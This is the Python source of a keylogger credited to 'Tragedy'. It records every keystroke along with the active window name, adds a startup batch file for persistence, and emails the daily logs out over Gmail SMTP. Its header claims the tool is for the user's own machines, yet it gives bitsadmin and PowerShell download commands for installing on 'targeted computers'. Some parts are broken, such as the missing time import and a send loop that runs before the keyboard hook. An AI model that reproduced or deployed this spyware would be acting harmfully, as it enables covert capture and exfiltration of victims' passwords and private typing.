#!/usr/bin/python
#                                     [+]---- 'Alleged' Key Logger ----[+]
#                                     |           -Tragedy-            |
# [+]=Info=---------------------------[+]------------------------------[+]--------------------------------------[+]
#  | ~ This Was Created To Be Ran On Computers That Are Owned By The User                                        |
#  | ~ You Can Either Manually Download The Required Modules On Targeted Computers Or Do It Through Batch        |
#  | ~ This Can Be Achieved By Utilizing B.I.T.S.:                                                               |
#  |      bitsadmin.exe /transfer "JobName" http://Download.Url/Here.exe C:Path-To-Destination-Here              |
#  | ~ Or Powershell:                                                                                            |
#  |      powershell -Command "Invoke-WebRequest http://Download.Url/Here.zip -OutFile Here.zip"                 |
#  | ~ Both Of Which Install With Windows                                                                        |
# [+]=Features=-------------------------------------------------------------------------------------------------[+]
#  | ~ Auto-Creates A Bat That Starts Program On PC Startup (Un-Called In This Paste To Keep Away From Idiots)   |
#  | ~ Stores Each Line Rather Than One Char Per Line (Separates Lines When Enter/Tab Is Pressed)                |
#  | ~ Removes Character When Backspace Is Pressed To Make Final Output Coherent                                 |
#  | ~ DateTime Module To Make A New Log File Each Day + To Set Interval                                         |
#  | ~ Sends Log Via Gmail At Set Interval (One Thing Needs To Be Added - Again, To Keep Idiots From Using)      |
#  | ~ Displays The Type Of Window The Text Was Typed Into - (Eg 'youtube', 'google', 'microsoft word')          |
# [+]-----------------------------------------------------------------------------------------------------------[+]

import getpass
import os.path
import smtplib
import pyHook, pythoncom
from datetime import datetime
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

UN = getpass.getuser()

def add(f_pth=""): 
    if f_pth == "":
        f_pth = os.path.dirname(os.path.realpath(__file__))
    b_pth = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % UN
    with open(b_pth + '\\' + "Alleged.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % f_pth)

td = datetime.now().strftime('%Y-%b-%d')
f_name = 'D:\\Documents\\Programming\\Python\\Keylogger\\Logs\\'+ td +'.txt'
#=====================================================#
#Gmail Log Sender - Tragedy
#Disable 2FA And Allow "Less Secure Apps"
#Change first_email_time And Choose Your Interval
def Send_Log():
    fromaddr = "Sender Email Addr" #ChangeMe
    toaddr = "Receiver Email Addr" #ChangeMe

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Desired Subject" #ChangeMe
    body = "Text To Send" #ChangeMe
    msg.attach(MIMEText(body, 'plain'))

    filename = "FileName.WithExtension" #ChangeMe
    attachment = open("D:\\Documents\\Programming\\Python\\Keylogger\\Logs\\"+ td +".txt", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "Sender Email Password") #ChangeMe
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def Send_Log_At(send_time):
    time.sleep(send_time.timestamp() - time.time())
    Send_Log()

first_email_time = datetime.datetime(2019,8,25,3,0,0) #Sending Time In UTC
interval = datetime.timedelta(minutes=2*60) #Sending Interval 

send_time = first_email_time
while True:
    Send_Log_At(send_time)
    send_time = send_time + interval
#===================================================#
line_buf = ""
win_nm = ""

def SVLN(line):
    curr_t = datetime.now().strftime('%H:%M:%S')
    line = "[" + curr_t + "] " + line
    td_f = open(f_name, 'a')
    td_f.write(line)
    td_f.close()

def KBEV(event):
    global line_buf
    global win_nm

    if(win_nm != event.WindowName): 
        if(line_buf != ""):
            line_buf += '\n'
            SVLN(line_buf) #Any Non-Printed Lines From Old Window

        line_buf = "" #Clear
        SVLN('\n[+] --- Window: ' + event.WindowName + '--- [+]\n')
        win_nm = event.WindowName #Setting New Window

    if(event.Ascii == 13 or event.Ascii == 9): #Return/Tab
        line_buf += '\n'
        SVLN(line_buf)
        line_buf = ""
        return True

    if(event.Ascii == 8): #Backspace
        line_buf = line_buf[:-1] #Remove Last Char
        return True

    if(event.Ascii < 32 or event.Ascii > 126):
        if(event.Ascii == 0): #(Arrow Keys, Shift, Ctrl, Alt Etc)
            pass #Do Nothing
        else:
            line_buf = line_buf + '\n' + str(event.Ascii) + '\n'
    else:
        line_buf += chr(event.Ascii)
        
    return True #Pass Event

hooks_manager = pyHook.HookManager() #Hook Manager
hooks_manager.KeyDown = KBEV #Watch
hooks_manager.HookKeyboard() #Set Hook
pythoncom.PumpMessages() #Wait